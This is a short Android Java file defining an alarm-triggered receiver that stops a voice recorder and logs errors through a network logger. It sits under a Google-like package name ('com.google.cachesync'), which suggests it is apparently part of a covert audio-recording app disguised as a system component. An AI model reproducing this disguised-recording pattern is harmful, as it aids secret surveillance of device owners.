package com.google.cachesync;

import com.code4bones.utils.NetLog;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;



public class AlarmReceiver extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {
		
		try {
			VoiceRecorder vr = VoiceRecorder.getInstance(context,null,0);
			vr.stop();
		} catch (Exception e) {
			NetLog.v("Voice: %s\r\n",e.getMessage());
		}
	}

}
